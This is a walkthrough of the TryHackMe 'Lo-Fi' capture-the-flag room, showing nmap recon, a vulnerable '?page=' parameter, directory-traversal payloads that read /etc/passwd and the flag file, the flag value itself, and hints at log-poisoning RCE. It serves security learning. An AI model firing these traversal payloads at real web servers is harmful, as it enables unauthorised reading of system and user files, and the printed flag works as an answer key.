# 🎧 TryHackMe - *Lo-Fi* Room Walkthrough

### 🗿 *"Rooting in Peace, One Vibe at a Time..."*

**Room:** [https://tryhackme.com/room/lofi](https://tryhackme.com/room/lofi) <br/>
**Author:** TryHackMe <br/>
**Difficulty:** *Easy-Chill* <br/>
**Tags:** LFI, File Inclusion, Basic Web Enumeration <br/>
**Vibes:** Maxed <br/>

<img width="934" height="388" alt="Cover" src="https://github.com/user-attachments/assets/9999830e-d465-45c3-a08b-4ea97e56cd8f" /> <br/>

---

## 🧠 Intro: Zen Hacking 101

Lofi + Hacking = peak productivity mode 🧘‍♂️.
This TryHackMe room invites you into a relaxed yet potent hacking space where the goal is simple — capture the flag, but do it with **style**, **flow**, and **zero stress**.

There’s no SSH bruteforce or kernel exploits here. Just good old-fashioned **Local File Inclusion (LFI)**, a vulnerable web server, and that flag.txt hidden in plain sight.

---

## 📡 Step 1: Nmap Recon — Know Thy Target

Start by tossing out an aggressive but optimized `nmap` scan:

```bash
nmap -sV -T4 10.10.98.193
```

<img width="1150" height="404" alt="nmap" src="https://github.com/user-attachments/assets/229805d1-3952-45c4-8f6b-0ba52c0dbe0b" /> <br/>

### 🎯 Output Summary:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
```

🧘 Interpret this like a cyber-monk:

* **Port 22** is SSH (keep this in your back pocket).
* **Port 80** is the main dish — Apache 2.2.22, pretty ancient (think 2011), so vulnerabilities might be there.

Let’s dive into the web application hosted on port 80.

---

## 🌐 Step 2: Web Vibes — Exploring the Site

We visit `http://10.10.98.193/` and are met with a visually *relaxing* Lofi-themed website. No login, no forms — just serene content and smooth background beats (you can almost hear them) 🎶

<img width="1911" height="1027" alt="site" src="https://github.com/user-attachments/assets/0e84a900-0762-4ea1-9803-82c9b4123964" /> <br/>

Checking the **page source**, we spot the real vulnerability hint:

```html
<li><a href="/?page=relax.php">Relax</a></li>
<li><a href="/?page=sleep.php">Sleep</a></li>
<li><a href="/?page=chill.php">Chill</a></li>
<li><a href="/?page=coffee.php">Coffee</a></li>
<li><a href="/?page=vibe.php">Vibe</a></li>
<li><a href="/?page=game.php">Game</a></li>
```

<img width="1919" height="1025" alt="source_code" src="https://github.com/user-attachments/assets/2f1feb9e-e5f2-47b1-ad84-2ca6da275f23" /> <br/>

The `?page=` parameter is controlling the included content.

🧠 Classic **file inclusion** format. Time to see how far we can stretch it...

---

## 🕵️‍♂️ Step 3: Testing for LFI — Open the Rabbit Hole

Let’s attempt to include system files using **directory traversal**:

```bash
http://10.10.98.193/?page=../../../../etc/passwd
```

<img width="1909" height="1030" alt="passwd" src="https://github.com/user-attachments/assets/268cf7c1-c90a-437e-b4d1-1c804aa40b94" /> <br/>

### ✅ Success!

Output confirms that the web server is indeed vulnerable to **LFI**. We now have access to arbitrary files on the system, at least those readable by the Apache user (`www-data`).

Here’s a snippet from the response:

```
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/bin/sh  
www-data:x:33:33:www-data:/var/www:/bin/sh  
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh  
```

🧠 Realization hits: If we can access `/etc/passwd`, we can very likely find the **flag** if it’s in a known or guessable location.

---

## 🏴 Step 4: Capture the Flag — No Resistance

Let’s try the classic `flag.txt` guess at root directory level:

```bash
http://10.10.98.193/?page=../../../../flag.txt
```

<img width="1913" height="1031" alt="flag" src="https://github.com/user-attachments/assets/1f7d787d-9969-46cb-84dc-095eb5dcdbc2" /> <br/>
 
> **flag{e4478e0eab69bd642b8238765dcb7d18}**

🎯 Direct hit. No fancy tricks, no post-exploitation, no privilege escalation. Just vibes, baby 🗿.

---

## 📂 Extra Notes (Because I Know You Like It Deep)

### 🔐 Why does LFI happen?

LFI (Local File Inclusion) usually stems from dynamically including files via user-supplied input, like:

```php
include($_GET["page"]);
```

Without proper validation or sanitization, attackers can traverse directories using `../` to include files like:

* `/etc/passwd`
* Apache logs
* `/proc/self/environ`
* config files (`wp-config.php`, etc.)

### 🧪 Further Testing You *Could* Do:

* Check for `/proc/self/environ` for possible **RCE via log poisoning**
* Check for local Apache logs `/var/log/apache2/access.log`
* Bruteforce common file locations
* Access `/home/*` for juicy user data

But in this room, all you need is that flag.

---

## 🎧 Final Thoughts:

LoFi isn’t just for chill beats, it’s for chill hacks. This room is perfect for:

✅ Newbies testing LFI
✅ Practicing enumeration skills
✅ Reminding yourself that not every CTF needs Metasploit or RCE

Sometimes, it’s just about spotting the breadcrumbs the app throws at you and vibing your way to the flag 🧃

---

## 🖋️ Writeup Summary

| Step               | Action                                   |
| ------------------ | ---------------------------------------- |
| 🔍 Recon           | `nmap -sV` to discover Apache on port 80 |
| 🔬 Source Analysis | Found `?page=` param hinting LFI         |
| 🕳️ Exploited LFI  | Included `/etc/passwd`                   |
| 🏁 Found Flag      | Included `/flag.txt` successfully        |

---

## ✨ Flag

```
flag{e4478e0eab69bd642b8238765dcb7d18}
```

---

## ☕ LoFi Hacker Tip of the Day:

> *“In a world full of overflows and shellshock, sometimes a humble `?page=../../` is all it takes.”* 🗿

---

## 👋 Goodbye Note

And that’s a wrap on the *Lofi* room, fellow hackers 🗿🎧
From peaceful beats to sneaky payloads, we drifted through the code like a digital ronin — calm, calculated, and flag-focused. This room was more than just a CTF… it was a **vibe check for your recon and LFI game**.

Till the next box,
Keep hacking, keep vibing, and never forget:

> *"Root access is temporary. Style is forever."*

~ Aditya Bhatt 🖤

---
